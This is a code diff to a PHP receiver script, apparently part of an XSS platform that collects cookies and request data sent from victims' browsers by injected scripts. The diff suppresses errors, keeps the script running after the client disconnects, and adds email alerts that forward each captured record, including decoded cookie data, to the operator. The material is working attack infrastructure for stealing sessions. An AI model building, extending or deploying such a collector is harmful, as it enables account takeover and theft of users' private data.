@@ -1,5 +1,8 @@
 <?php
 define("IN_XSS_PLATFORM",true);
+ignore_user_abort(true);
+error_reporting(0);
+
 //sometimes we only need "referfer".
 /*
 if(count($_GET)==0&&count($_POST)==0&&count($_COOKIE)==0)
@@ -8,6 +11,7 @@ if(count($_GET)==0&&count($_POST)==0&&count($_COOKIE)==0)
 header("Access-Control-Allow-Origin:*"); 
 require_once("functions.php");
 require_once("dio.php");
+require_once("config.php");
 
 $info = array();
 
@@ -53,4 +57,11 @@ if($decoded_cookie_data)
 $info['keepsession']=isKeepSession($info)?true:false;
 
 save_xss_record(json_encode($info),$request_time);
+
+//发送邮件通知
+if(MAIL_ENABLE) {
+	require_once("mail.php");
+	send_mail($info);
+}
+
 ?>
